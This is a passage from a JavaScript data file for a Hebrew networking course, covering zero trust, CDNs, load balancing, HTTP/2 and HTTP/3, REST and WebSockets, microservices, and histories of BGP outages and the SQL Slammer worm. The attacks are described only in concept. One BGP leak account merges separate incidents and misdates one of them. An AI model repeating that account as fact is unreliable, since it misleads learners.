              <p><strong>Zero Trust Architecture</strong> — הגישה המודרנית: "לעולם אל תאמין, תמיד אמת".</p>
              <p>בניגוד לחשיבה ש-<code>VPN</code> פנימה = אמון, בגישת Zero Trust כל בקשה נבדקת מחדש:</p>
              <ul>
                <li>זהות המשתמש</li>
                <li>מצב המכשיר</li>
                <li>הקשר הבקשה</li>
              </ul>
              <p>כל שירות מגן על עצמו בנפרד.</p>
              <p><strong>דוגמה:</strong> <code>Google BeyondCorp</code> (2011) — עובדים ניגשים ממסביב לעולם בלי VPN ארגוני. הכל מבוסס על זיהוי זהות.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 21",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>VPN</code> = מנהרה מוצפנת. <code>Remote Access</code> (עובד מהבית), <code>Site-to-Site</code> (בין משרדים)</li>
              <li><code>IPsec</code>: <code>ESP</code> (הצפנה + אימות), <code>Tunnel mode</code> (כל הפקטה עטופה). <code>IKEv2</code> מועדף</li>
              <li><code>WireGuard</code>: מינימליסטי, מהיר, <code>UDP</code>, <code>keys</code> בלבד. <code>Kernel-native</code> ב-<code>Linux</code></li>
              <li><code>Split Tunneling</code>: רק רשת ארגונית דרך <code>VPN</code>. <code>Full Tunnel</code>: הכל</li>
              <li>איומים: <code>ARP Spoofing</code>, <code>DNS Poisoning</code>, <code>SYN Flood</code>, <code>Port Scanning</code>, <code>MITM</code></li>
              <li><code>Zero Trust</code> = אל תאמין, תמיד אמת. גם אחרי כניסה לרשת הארגונית</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 21",
        titleEn: "Chapter 21 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין IPsec Tunnel mode ל-Transport mode?",
            a: "Transport mode: מוצפן רק ה-payload, IP Header המקורי גלוי. לתקשורת Host-to-Host. Tunnel mode: כל הפקטה המקורית (כולל IP Header) נעטפת בפקטה חדשה עם IP של ה-Gateway. ל-VPN Site-to-Site.",
            qEn: "What is the difference between IPsec Tunnel mode and Transport mode?",
            aEn: "Transport mode: only the payload is encrypted, the original IP Header is visible. Used for Host-to-Host. Tunnel mode: the entire original packet (including IP Header) is wrapped in a new packet with the Gateway IP. Used for Site-to-Site VPN."
          },
          {
            q: "למה WireGuard בוחרת cryptography קבוע ולא negotiable?",
            a: "Cipher agility = יותר קוד, יותר surface להתקפה, ניתן לכפות downgrade לאלגוריתם חלש. WireGuard בוחר: אנחנו משתמשים ב-ChaCha20+Curve25519 כי הם הכי טובים היום. פחות קוד = פחות bugs. נקרא Cryptographic Opinionation.",
            qEn: "Why does WireGuard choose fixed cryptography instead of negotiable?",
            aEn: "Cipher agility means more code, more attack surface, and the ability to force a downgrade to a weak algorithm. WireGuard chooses ChaCha20+Curve25519 because they are the best today. Less code means fewer bugs. This is called Cryptographic Opinionation."
          },
          {
            q: "מה SYN Flood ואיך SYN Cookies פותר?",
            a: "SYN Flood: תוקף שולח מיליוני SYN עם IP מזויף. שרת מקצה state לכל SYN ועומד להיחנק. SYN Cookies: שרת לא מקצה state – במקום זאת מחזיר SYN-ACK עם ISN שמוצפן מה-IP/Port/timestamp. רק ACK תקין מוכיח שהלקוח אמיתי.",
            qEn: "What is SYN Flood and how does SYN Cookies solve it?",
            aEn: "SYN Flood: an attacker sends millions of SYN packets with fake IPs. The server allocates state for each SYN and runs out of resources. SYN Cookies: the server does not allocate state — instead it returns a SYN-ACK with an ISN encoded from the IP/Port/timestamp. Only a valid ACK proves the client is real."
          }
        ]
      }
    ]
  },
  {
    id: 22,
    title: "ארכיטקטורת אינטרנט מודרנית – CDN, Load Balancer, HTTP/2",
    pages: [
      {
        type: "explanation",
        title: "CDN – רשת הפצת תוכן",
        content: `
          <p>כשגולשים ל-Netflix מישראל — הסרטון לא מגיע מאמריקה כל פעם.</p>
          <p><strong><code>CDN</code></strong> — <code>Content Delivery Network</code></p>
          <p>רשת שרתי "קצה" מפוזרת גלובלית שמגישה תוכן ממקום קרוב.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 120" class="content-diagram">
              <circle cx="170" cy="60" r="25" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="170" y="57" text-anchor="middle" font-size="9">Origin</text>
              <text x="170" y="70" text-anchor="middle" font-size="9">Server</text>
              <circle cx="60" cy="30" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="60" y="27" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="60" y="40" text-anchor="middle" font-size="7" fill="white">ת"א</text>
              <circle cx="290" cy="30" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="290" y="27" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="290" y="40" text-anchor="middle" font-size="7" fill="white">NY</text>
              <circle cx="60" cy="95" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="60" y="92" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="60" y="105" text-anchor="middle" font-size="7" fill="white">טוקיו</text>
              <circle cx="290" cy="95" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="290" y="92" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="290" y="105" text-anchor="middle" font-size="7" fill="white">לונדון</text>
              <line x1="145" y1="60" x2="78" y2="35" stroke="var(--accent)" stroke-dasharray="4,3"/>
              <line x1="195" y1="60" x2="272" y2="35" stroke="var(--accent)" stroke-dasharray="4,3"/>
              <line x1="145" y1="65" x2="78" y2="90" stroke="var(--accent)" stroke-dasharray="4,3"/>
              <line x1="195" y1="65" x2="272" y2="90" stroke="var(--accent)" stroke-dasharray="4,3"/>
            </svg>
            <p class="diagram-caption">CDN: Origin אחד + PoPs גלובליים. משתמש מקבל מה-PoP הקרוב</p>
          </div>
          <p><strong>איך CDN עובד:</strong></p>
          <ol>
            <li><code>DNS</code> מחזיר IP של ה-<code>PoP</code> הקרוב — באמצעות <code>Anycast</code></li>
            <li><code>PoP</code> בודק cache: <code>Cache HIT</code> — מגיש מיידית, כ-5ms. <code>Cache MISS</code> — מביא מ-Origin, שומר, ומגיש</li>
            <li>תוכן סטטי — תמונות, JS, CSS — נשמר זמן רב. תוכן דינמי — עובר ישר ל-Origin</li>
          </ol>
          <p>CDN גדולים: <code>Cloudflare</code> — מעל 300 PoPs, <code>Akamai</code> — מעל 4,000 PoPs, <code>AWS CloudFront</code>, <code>Fastly</code>.</p>
          <p><strong>יתרונות נוספים של CDN:</strong></p>
          <ul>
            <li><strong>TLS Termination בקצה</strong> – ה-<code>Handshake</code> מתבצע עם שרת קרוב, מה שמוריד השהיה משמעותית</li>
            <li><strong>הגנה מ-DDoS</strong> – <code>Anycast</code> מפזר את ההתקפה בין נקודות רבות</li>
            <li><strong>תמיכה ב-HTTP/2 ו-HTTP/3</strong> – גם אם שרת המקור ישן ולא תומך בגרסאות חדשות</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "Load Balancer – פיזור עומס",
        content: `
          <p><strong><code>Load Balancer</code></strong> מקבל בקשות ומפנה אותן לאחד מכמה שרתים.</p>
          <p>מאפשר Scale-out (הוספת שרתים) וגם High Availability — שרת נפל? הבקשה הולכת לאחר.</p>
          <p><strong>אלגוריתמי Balancing:</strong></p>
          <table class="content-table">
            <tr><th>אלגוריתם</th><th>הגיון</th><th>מתאים ל</th></tr>
            <tr><td><code>Round Robin</code></td><td>בתור מחזורי</td><td>בקשות שוות זמן עיבוד</td></tr>
            <tr><td><code>Least Connections</code></td><td>לשרת עם הכי פחות חיבורים פעילים</td><td>בקשות שונות זמן עיבוד</td></tr>
            <tr><td><code>IP Hash</code></td><td><code>hash</code> של <code>IP</code> הלקוח → תמיד אותו שרת</td><td><code>Session affinity</code> — עגינה</td></tr>
            <tr><td><code>Weighted</code></td><td>שרתים חזקים מקבלים יותר</td><td>שרתים בעלי חומרה שונה</td></tr>
          </table>
          <p><strong>שכבות:</strong></p>
          <ul>
            <li><strong>L4 Load Balancer</strong> — פועל על <code>TCP</code>/<code>UDP</code>. מהיר, אבל לא "רואה" HTTP — לא יכול לנתב לפי URL</li>
            <li><strong>L7 Load Balancer</strong> — מבין <code>HTTP</code>. יכול לנתב לפי path: <code>/api</code> → שרתי API, <code>/static</code> → שרתי CDN. מאפשר <code>SSL termination</code>, <code>header injection</code>, <code>health checks</code></li>
          </ul>
          <p><strong>Health Checks:</strong> ה-Load Balancer שולח בקשות בדיקה לכל שרת.</p>
          <p>שרת שלא עונה מוצא מהמחזור אוטומטית.</p>
          <p><strong>High Availability</strong> — <code>HA</code></p>
          <p>זוג Load Balancers — ראשי וגיבוי — Primary + Standby — עם מעבר אוטומטי בתקלה — <code>Failover</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "HTTP/2 ו-HTTP/3 – הדורות הבאים",
        content: `
          <p><strong><code>HTTP/1.1</code></strong> — 1997</p>
          <p>עובד במודל בקשה-תגובה.</p>
          <p>כל חיבור מטפל בבקשה אחת בכל פעם.</p>
          <p>הבעיה המרכזית: <code>Head-of-Line Blocking</code> — HOL.</p>
          <p>בקשה שתקועה חוסמת את כל הבקשות שאחריה.</p>
          <p><strong><code>HTTP/2</code></strong> — 2015. שיפורים עיקריים:</p>
          <ul>
            <li><strong><code>Multiplexing</code></strong> – כמה בקשות על חיבור <code>TCP</code> אחד בו-זמנית. פותר <code>HOL blocking</code> ב-<code>Application layer</code></li>
            <li><strong><code>Binary Protocol</code></strong> – לא טקסט. יעיל יותר לניתוח</li>
            <li><strong>Header Compression</strong> — <code>HPACK</code>. Headers חוזרים נשלחים רק פעם אחת</li>
            <li><strong>Server Push</strong> — שרת יכול לשלוח resources לפני שהלקוח ביקש — CSS יחד עם HTML</li>
            <li><strong><code>Stream Priority</code></strong> – בקשות ניתנות לתעדוף</li>
          </ul>
          <p><strong><code>HTTP/3</code></strong> — 2022. מעל <code>QUIC</code> — <code>UDP</code>:</p>
          <ul>
            <li><strong><code>QUIC</code></strong> – <code>UDP</code> עם <code>congestion control</code> + <code>TLS 1.3</code> מובנה. תומך ב-<code>0-RTT Handshake</code></li>
            <li><strong>אין HOL Blocking גם ב-TCP level</strong> – כל stream עצמאי. ב-HTTP/2, חבילת TCP אבודה חוסמת את כל ה-streams</li>
            <li><strong><code>Connection Migration</code></strong> – מבוסס על <code>Connection ID</code>, לא <code>IP:Port</code>. מעבר <code>WiFi</code> → <code>Cellular</code> ללא ניתוק</li>
          </ul>
          <p>כ-60% מתעבורת YouTube היא HTTP/3.</p>
          <p>Cloudflare, Google ו-Facebook — כולם HTTP/3.</p>
        `
      },
      {
        type: "explanation",
        title: "REST API ו-WebSockets",
        content: `
          <p><strong><code>REST API</code></strong> — <code>Representational State Transfer</code></p>
          <p>ארכיטקטורת API על <code>HTTP</code>.</p>
          <p>כל משאב = URL. פעולות = HTTP Methods:</p>
          <table class="content-table">
            <tr><th>Method</th><th>פעולה</th><th>דוגמה</th></tr>
            <tr><td>GET</td><td>קריאה</td><td>GET /users/42 → פרטי משתמש</td></tr>
            <tr><td>POST</td><td>יצירה</td><td>POST /users → משתמש חדש</td></tr>
            <tr><td>PUT</td><td>עדכון מלא</td><td>PUT /users/42 → החלפה מלאה</td></tr>
            <tr><td>PATCH</td><td>עדכון חלקי</td><td>PATCH /users/42 → שינוי שדה</td></tr>
            <tr><td>DELETE</td><td>מחיקה</td><td>DELETE /users/42</td></tr>
          </table>
          <p>התגובה מגיעה בדרך כלל בפורמט <code>JSON</code>.</p>
          <p><strong>קודי סטטוס HTTP נפוצים:</strong></p>
          <ul>
            <li><code>200</code> — OK</li>
            <li><code>201</code> — Created — נוצר</li>
            <li><code>400</code> — Bad Request — בקשה שגויה</li>
            <li><code>401</code> — Unauthorized — לא מאומת</li>
            <li><code>403</code> — Forbidden — אין הרשאה</li>
            <li><code>404</code> — Not Found — לא נמצא</li>
            <li><code>500</code> — Server Error — שגיאת שרת</li>
          </ul>
          <p><strong><code>WebSockets</code></strong> – חיבור דו-כיווני מתמשך מעל <code>HTTP</code>.</p>
          <p>החיבור מתחיל בבקשת <code>Upgrade</code> מ-HTTP ל-WebSocket.</p>
          <p>אחרי השדרוג, שני הצדדים יכולים לשלוח ולקבל מידע בחופשיות — ללא התקורה של מודל בקשה-תגובה.</p>
          <p><strong>שימושים נפוצים:</strong></p>
          <ul>
            <li>צ'אט בזמן אמת</li>
            <li>משחקים מקוונים</li>
            <li>פלטפורמות מסחר</li>
            <li>דשבורדים חיים</li>
          </ul>
          <div class="code-preview">
            <pre><code>// לקוח WebSocket ב-JavaScript
const ws = new WebSocket('wss://chat.example.com/ws')
ws.onopen = () => ws.send(JSON.stringify({msg: 'שלום!'}))
ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "Microservices ו-Service Mesh",
        content: `
          <p><strong>Monolith לעומת Microservices:</strong></p>
          <ul>
            <li><strong><code>Monolith</code></strong> — כל הקוד ביישום אחד גדול. פשוט לפתח, קשה להרחיב</li>
            <li><strong><code>Microservices</code></strong> — כל פיצ'ר הוא שירות עצמאי. שירותים מתקשרים ביניהם דרך <code>HTTP</code> או <code>gRPC</code></li>
          </ul>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 100" class="content-diagram">
              <rect x="10" y="20" width="100" height="60" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="60" y="50" text-anchor="middle" font-size="10">Monolith</text>
              <text x="60" y="64" text-anchor="middle" font-size="8" fill="var(--text-muted)">All-in-one</text>
              <rect x="160" y="10" width="50" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="185" y="29" text-anchor="middle" font-size="8" fill="white">Users</text>
              <rect x="220" y="10" width="50" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="245" y="29" text-anchor="middle" font-size="8" fill="white">Orders</text>
              <rect x="280" y="10" width="50" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="305" y="29" text-anchor="middle" font-size="8" fill="white">Pay</text>
              <rect x="160" y="60" width="50" height="30" rx="4" fill="var(--accent-gold)" stroke="var(--accent-gold)" opacity="0.7"/>
              <text x="185" y="78" text-anchor="middle" font-size="8">Catalog</text>
              <rect x="220" y="60" width="50" height="30" rx="4" fill="var(--accent-gold)" stroke="var(--accent-gold)" opacity="0.7"/>
              <text x="245" y="78" text-anchor="middle" font-size="8">Notify</text>
              <rect x="280" y="60" width="50" height="30" rx="4" fill="var(--accent-gold)" stroke="var(--accent-gold)" opacity="0.7"/>
              <text x="305" y="78" text-anchor="middle" font-size="8">Search</text>
            </svg>
          </div>
          <p><strong><code>Service Mesh</code></strong> — <code>Istio</code>, <code>Linkerd</code>:</p>
          <p>בארכיטקטורת <code>microservices</code>, כל שירות מתקשר עם עשרות שירותים אחרים.</p>
          <p><code>Service Mesh</code> מוסיף <code>sidecar proxy</code> ליד כל שירות, שמטפל אוטומטית ב:</p>
          <ul>
            <li><code>TLS</code> בין שירותים</li>
            <li><code>Load Balancing</code></li>
            <li><code>Circuit Breaking</code> — ניתוק שירות תקול</li>
            <li><code>Tracing</code> — מעקב אחרי בקשות</li>
          </ul>
          <p>כל זאת ללא שינוי בקוד של השירות עצמו.</p>
          <p><strong><code>API Gateway</code></strong> – נקודת כניסה אחת לכל ה-<code>microservices</code>.</p>
          <p>מטפל ב:</p>
          <ul>
            <li>אימות — <code>Auth</code></li>
            <li>הגבלת קצב — <code>Rate Limiting</code></li>
            <li>ניתוב — <code>Routing</code></li>
            <li>רישום לוגים — <code>Logging</code></li>
          </ul>
          <p>מוצרים נפוצים: <code>AWS API Gateway</code>, <code>Kong</code>, <code>Nginx</code>.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – ארכיטקטורה מודרנית",
        intro: "<p>כיצד האינטרנט ממש עובד בגדול:</p>",
        blocks: [
          {
            title: "Anycast – אותה כתובת, מיקומים שונים",
            icon: "🗺️",
            content: `
              <p><strong>Anycast</strong> — אותה כתובת IP מוכרזת ב-<code>BGP</code> מכמה מקומות בעולם. הרשת מנתבת את התעבורה ל-<code>PoP</code> הקרוב ביותר.</p>
              <p><strong>דוגמה:</strong> <code>1.1.1.1</code> של Cloudflare = אותה כתובת IP ב-300+ מקומות.</p>
              <p><strong>הגנה מ-DDoS:</strong> התקפה של 1Tbps מתחלקת בין 300 נקודות — כל <code>PoP</code> מקבל רק כ-3Gbps. זו הסיבה שרשתות כמו Cloudflare עמידות גם מול התקפות ענק.</p>
            `
          },
          {
            title: "Edge Computing – חישוב ב-PoP",
            icon: "⚡",
            content: `
              <p>נקודות ה-<code>PoP</code> של CDN הן לא רק מטמון. <strong>Edge Computing</strong> = הרצת קוד בשרת הקרוב ביותר למשתמש.</p>
              <p><strong>דוגמאות:</strong> <code>Cloudflare Workers</code>, <code>AWS Lambda@Edge</code> — פונקציות שרצות במרחק של כ-5ms מהמשתמש, במקום 150ms לשרת המקור.</p>
              <p><strong>שימושים:</strong></p>
              <ul>
                <li>התאמה אישית בזמן אמת</li>
                <li><code>A/B testing</code></li>
                <li>אימות משתמשים</li>
              </ul>
              <p>הכל ב-edge, ללא השהיית round-trip לשרת המקור.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 22",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>CDN</code>: <code>PoPs</code> גלובליים + <code>Anycast</code>. <code>Cache HIT</code> = מהיר. <code>Cache MISS</code> = מ-<code>Origin</code>. מגן מ-<code>DDoS</code></li>
              <li><code>Load Balancer</code>: <code>L4</code> — <code>TCP</code> / <code>L7</code> — <code>HTTP</code>. <code>Round Robin</code>, <code>Least Connections</code>, <code>IP Hash</code>. <code>Health Checks</code></li>
              <li><code>HTTP/2</code>: <code>Multiplexing</code>, <code>Binary</code>, <code>HPACK</code>, <code>Server Push</code>. <code>HTTP/3</code>: <code>QUIC</code> — <code>UDP</code>, <code>0-RTT</code>, <code>Connection Migration</code></li>
              <li><code>REST</code>: <code>GET</code>/<code>POST</code>/<code>PUT</code>/<code>PATCH</code>/<code>DELETE</code> על <code>URLs</code>. <code>JSON</code>. <code>WebSockets</code>: חיבור דו-כיווני מתמשך</li>
              <li><code>Microservices</code>: שירותים עצמאיים. <code>Service Mesh</code>: <code>sidecar proxy</code>. <code>API Gateway</code>: כניסה אחת</li>
              <li><code>Anycast</code> = אותה <code>IP</code> במקומות רבים. <code>Edge Computing</code> = קוד ב-<code>PoP</code> הקרוב</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 22",
        titleEn: "Chapter 22 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין Cache HIT ל-Cache MISS ב-CDN?",
            a: "Cache HIT: הקובץ המבוקש קיים ב-PoP הקרוב ועדיין בתוקף → מוגש מיידית (5–15ms). Cache MISS: הקובץ לא ב-PoP → PoP מביא מ-Origin Server (~150ms) → שומר ב-cache → מגיש. לבקשות הבאות לאותו PoP → HIT.",
            qEn: "What is the difference between Cache HIT and Cache MISS in a CDN?",
            aEn: "Cache HIT: the requested file exists in the nearby PoP and is still valid — served immediately (5-15ms). Cache MISS: the file is not in the PoP — the PoP fetches it from the Origin Server (~150ms), saves it in cache, and serves it. Future requests to the same PoP will be a HIT."
          },
          {
            q: "מה הפתרון של HTTP/3 לבעיה של HTTP/2?",
            a: "HTTP/2 עם Multiplexing פתר HOL Blocking ב-Application Layer – אבל TCP עדיין בעיה: חבילה אחת אבודה = כל ה-streams מחכים (HOL Blocking ברמת TCP). HTTP/3 מעל QUIC (UDP): כל stream עצמאי גם ב-transport layer. אובדן חבילה = רק stream אחד מושפע.",
            qEn: "What is HTTP/3's solution to the HTTP/2 problem?",
            aEn: "HTTP/2 with Multiplexing solved HOL Blocking at the Application Layer — but TCP is still a problem: one lost packet means all streams wait (HOL Blocking at TCP level). HTTP/3 runs on QUIC (UDP): each stream is independent at the transport layer too. A lost packet affects only one stream."
          },
          {
            q: "מתי WebSockets עדיפים על REST API רגיל?",
            a: "REST = Request-Response. כל עדכון = round-trip. לתוכן שמשתנה תכופות (chat, game, trading, live dashboard) – polling = overhead עצום. WebSocket = חיבור פתוח. שרת שולח עדכון מיידי ללא שהלקוח יבקש. כשצריך real-time עם latency מינימלי.",
            qEn: "When are WebSockets better than a regular REST API?",
            aEn: "REST is Request-Response. Every update needs a round-trip. For content that changes often (chat, games, trading, live dashboards) polling creates huge overhead. WebSocket keeps an open connection. The server sends updates immediately without the client asking. Use it when you need real-time with minimal latency."
          }
        ]
      }
    ]
  },
  {
    id: 23,
    title: "כשל ואיתחול – סיפורי קריסות אינטרנט",
    pages: [
      {
        type: "explanation",
        title: "פייסבוק נפלה – 6 שעות של BGP כאוס",
        content: `
          <p><strong>4 באוקטובר 2021, 15:51 UTC.</strong> פייסבוק, אינסטגרם, ווטסאפ — כולם נעלמו מהאינטרנט בו-זמנית.</p>
          <p>3.5 מיליארד משתמשים. 6 שעות.</p>
          <p><strong>מה קרה?</strong></p>
          <p>בצעד תחזוקה שגרתי, מהנדס שינה הגדרות ב-<code>BGP</code> router.</p>
          <p>הפקודה השגויה ביטלה את כל ה-<code>prefix announcements</code> — פייסבוק הסירה את עצמה ממפת האינטרנט.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 380 130" class="content-diagram">
              <rect x="10" y="10" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="31" text-anchor="middle" font-size="9">ISP / רשת עולמית</text>
              <rect x="150" y="10" width="80" height="35" rx="4" fill="#fee2e2" stroke="#f87171"/>
              <text x="190" y="26" text-anchor="middle" font-size="9" fill="#dc2626">Facebook BGP</text>
              <text x="190" y="38" text-anchor="middle" font-size="8" fill="#dc2626">WITHDREW ALL</text>
              <rect x="290" y="10" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="330" y="31" text-anchor="middle" font-size="9">משתמשים</text>
              <line x1="90" y1="27" x2="148" y2="27" stroke="#f87171" stroke-width="2" stroke-dasharray="5,3"/>
              <text x="119" y="22" text-anchor="middle" font-size="8" fill="#dc2626">✗</text>
              <line x1="232" y1="27" x2="288" y2="27" stroke="#f87171" stroke-width="2" stroke-dasharray="5,3"/>
              <text x="260" y="22" text-anchor="middle" font-size="8" fill="#dc2626">✗</text>
              <rect x="60" y="65" width="260" height="55" rx="6" fill="#fef3c7" stroke="#f59e0b"/>
              <text x="190" y="82" text-anchor="middle" font-size="10" font-weight="bold" fill="#92400e">השלכות הקריסה</text>
              <text x="190" y="96" text-anchor="middle" font-size="8" fill="#92400e">• DNS של facebook.com לא ענה (השרתים גם הם בתוך הרשת)</text>
              <text x="190" y="108" text-anchor="middle" font-size="8" fill="#92400e">• עובדי פייסבוק לא יכלו להתחבר מרחוק לתקן</text>
              <text x="190" y="120" text-anchor="middle" font-size="8" fill="#92400e">• הפסד: ~$60M הכנסות + $6B ירידה בשווי מניה</text>
            </svg>
          </div>
          <p><strong>הבעיה העמוקה:</strong> הכלים לתיקון גם הם היו בתוך הרשת שנפלה.</p>
          <p>מהנדסים נאלצו לנסוע פיזית למרכז הנתונים.</p>
          <p>הם ניסו להיכנס עם badge שלא עבד — כי מערכת הגישה גם היא תלויה בפייסבוק.</p>
          <p><strong><code>BGP</code> — Border Gateway Protocol</strong> הוא הפרוטוקול שמנהל את "מפת האינטרנט".</p>
          <p>כל <code>AS</code> (Autonomous System) מכריז על ה-<code>prefixes</code> שלו.</p>
          <p>בלי הכרזות — אף אחד לא יודע איפה פייסבוק.</p>
        `
      },
      {
        type: "explanation",
        title: "SQL Slammer – 376 בתים ששיתקו את האינטרנט",
        content: `
          <p><strong>25 בינואר 2003, 05:30 UTC.</strong> תוך 10 דקות — 75,000 שרתים נדבקו.</p>
          <p>תוך 30 דקות — אינטרנט של דרום קוריאה קרס לחלוטין.</p>
          <p><strong>הנשק:</strong> תולעת בגודל 376 בתים בלבד — קטן מספיק להיכנס בחבילת <code>UDP</code> אחת.</p>
          <p>ניצלה חולשה ידועה ב-Microsoft SQL Server שכבר קיים לה <code>patch</code> מזה 6 חודשים.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 110" class="content-diagram">
              <circle cx="180" cy="55" r="8" fill="#dc2626"/>
              <text x="180" y="59" text-anchor="middle" font-size="7" fill="white">0</text>
              <text x="180" y="75" text-anchor="middle" font-size="8">שרת נגוע</text>
              <g opacity="0.8">
                <circle cx="80" cy="30" r="6" fill="#f87171"/>
                <circle cx="280" cy="30" r="6" fill="#f87171"/>
                <circle cx="80" cy="80" r="6" fill="#f87171"/>
                <circle cx="280" cy="80" r="6" fill="#f87171"/>
                <circle cx="130" cy="15" r="5" fill="#fca5a5"/>
                <circle cx="230" cy="15" r="5" fill="#fca5a5"/>
                <circle cx="50" cy="55" r="5" fill="#fca5a5"/>
                <circle cx="310" cy="55" r="5" fill="#fca5a5"/>
              </g>
              <line x1="180" y1="47" x2="85" y2="33" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <line x1="180" y1="47" x2="275" y2="33" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <line x1="180" y1="63" x2="85" y2="77" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <line x1="180" y1="63" x2="275" y2="77" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <text x="180" y="103" text-anchor="middle" font-size="8" fill="var(--text-muted)">כל שרת נגוע שולח לאלפי IP אקראיים — גדילה אקספוננציאלית</text>
            </svg>
          </div>
          <p><strong>מה עשתה התולעת?</strong></p>
          <ul>
            <li>נכנסה דרך פורט UDP 1434 (SQL Server Resolution Service)</li>
            <li>העתיקה את עצמה לזיכרון — <strong>לא לדיסק</strong>. ב-reboot — נעלמת</li>
            <li>שלחה עותקים לכתובות IP אקראיות במהירות מקסימלית</li>
            <li>כל שרת שלח UDP packets במהירות של network card — עד 50Mpps</li>
          </ul>
          <p><strong>הלקח:</strong> patch management.</p>
          <p>חולשה ידועה, patch זמין — אף אחד לא עדכן.</p>
          <p>בדיוק אותו תסריט חזר ב-2017 עם WannaCry.</p>
        `
      },
      {
        type: "explanation",
        title: "BGP Leaks – כשהניתוב הולך לאיבוד",
        content: `
          <p><code>BGP hijacking</code> ו-<code>BGP leaks</code> הם בין האיומים המסוכנים ביותר לאינטרנט — ולרוב אינם מוכרים לציבור.</p>
          <p><strong>הבעיה:</strong> ל-<code>BGP</code> אין <code>authentication</code> מובנה.</p>
          <p>כל <code>AS</code> יכול להכריז על כל <code>prefix</code> — בטעות או בכוונה.</p>
          <p><strong>2010 — China Telecom מנתב 15% מהאינטרנט דרך סין:</strong></p>
          <ul>
            <li>China Telecom הכריזה בטעות על ~50,000 prefixes — כולל כאלה של Dell, IBM, CNN, Army.mil</li>
            <li>18 דקות — תנועה מרחבי העולם עברה דרך סין</li>
            <li>המידע לא היה מוצפן. כל מי ששלט ב-routers יכל לקרוא</li>
          </ul>
          <p><strong>2019 — Cloudflare, Comcast, AWS מנותבים דרך ניגריה:</strong></p>
          <ul>
            <li>MainOne (ISP ניגרי) דלף routing ל-MTN ניגריה, שדלפה ל-China Telecom</li>
            <li>שעה וחצי של תנועה מסוננת</li>
          </ul>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 90" class="content-diagram">
              <rect x="10" y="25" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="48" text-anchor="middle" font-size="9">משתמש</text>
              <rect x="280" y="25" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="315" y="45" text-anchor="middle" font-size="9">Google</text>
              <text x="315" y="57" text-anchor="middle" font-size="8">8.8.8.8</text>
              <rect x="140" y="5" width="80" height="35" rx="4" fill="#fee2e2" stroke="#f87171"/>
              <text x="180" y="20" text-anchor="middle" font-size="9" fill="#dc2626">🇨🇳 China Telecom</text>
              <text x="180" y="32" text-anchor="middle" font-size="8" fill="#dc2626">"אני מכיר 8.8.8.8"</text>
              <path d="M 80 45 Q 180 80 280 45" stroke="var(--accent-green)" stroke-width="2" fill="none" stroke-dasharray="6,3"/>
              <text x="180" y="82" text-anchor="middle" font-size="8" fill="var(--text-muted)">מסלול תקין (BGP)</text>
              <path d="M 80 42 L 142 22" stroke="#f87171" stroke-width="2" fill="none"/>
              <path d="M 218 22 L 280 42" stroke="#f87171" stroke-width="2" fill="none"/>
              <text x="180" y="18" text-anchor="middle" font-size="8" fill="#dc2626">מסלול שנחטף</text>
            </svg>
          </div>
          <p><strong>הפתרון: <code>RPKI</code></strong> (Resource Public Key Infrastructure).</p>
          <p>מאפשר לבעלי <code>IP</code> לחתום קריפטוגרפית על הכרזות ה-<code>BGP</code> שלהם.</p>
          <p>האימוץ הולך וגדל, אך עדיין חלקי — האינטרנט עדיין פגיע.</p>
        `
      },
      {
        type: "explanation",
        title: "Postmortem – תרבות הלמידה מכשלים",
        content: `
          <p>בחברות הטכנולוגיה הגדולות — Google, Amazon, Netflix, Cloudflare — כשל הוא הזדמנות ללמוד, לא סיבה לפטר מישהו.</p>
          <p>זה נקרא "blameless postmortem culture".</p>
          <p><strong>מבנה הפוסטמורטם:</strong></p>
          <ul>
            <li><strong>Timeline:</strong> מה קרה בדיוק, מתי, מי הבחין ראשון</li>
